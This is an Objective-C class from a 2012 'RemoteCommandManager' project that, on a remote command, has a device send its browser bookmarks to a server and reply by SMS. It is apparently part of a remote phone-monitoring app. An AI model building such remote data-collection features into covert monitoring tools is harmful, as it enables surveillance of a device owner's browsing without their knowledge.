/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestBookmarkProcessor
 - Version      :  1.0  
 - Purpose      :  Ask the client to send its Bookmarks to the server
 - Copy right   :  10/07/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */
#import "RequestBookmarkProcessor.h"
#import "BookmarkManager.h"

@interface RequestBookmarkProcessor (private)
- (void) processRequestBookmark;
- (void) requestBookmarkException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end


@implementation RequestBookmarkProcessor

/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the RequestBookmarkProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@"RequestBookmarkProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the RequestBookmarkProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"RequestBookmarkProcessor--->doProcessingCommand")
	[self processRequestBookmark];
}


#pragma mark Private method

/**
 - Method name:			processRequestBookmark
 - Purpose:				This method is used to process Request Bookmark
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processRequestBookmark {
	DLog (@"RequestBookmarkProcessor ---> processRequestBookmark")
	id <BookmarkManager> bookmarkManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mBookmarkManager];
	BOOL isReady = [bookmarkManager deliverBookmark:self];
	if (!isReady) {
		DLog (@"!!! not ready to process request bookmark command")
		[self requestBookmarkException];
	}
	else {
		DLog (@".... processing request bookmark command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			requestBookmarkException
 - Purpose:				This method is invoked when it fails to send bookmark
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestBookmarkException {
	DLog (@"RequestBookmarkProcessor ---> requestBookmarkException");
	FxException* exception = [FxException exceptionWithName:@"requestBookmarkException" andReason:@"Request Bookmark error"];
	//[exception setErrorCode:kBookmarkManagerBusy];
	[exception setErrorCode:kCmdExceptionErrorCmdBeingRetried];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						 andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestBookmarkSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestBookmarkProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	}
	else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when request Bookmark process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"RequestBookmarkProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

// protocol BookmarkDelegate
- (void) deliverBookmarkDidFinished: (NSError *) aError {
	DLog (@"!!!!!!! RequestBookmarkProcessor ---> deliverBookmarkDidFinished")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *requestBookmarkMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestBookmarkSucessMSG2", @"")];		
		[self sendReplySMS:requestBookmarkMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}


@end
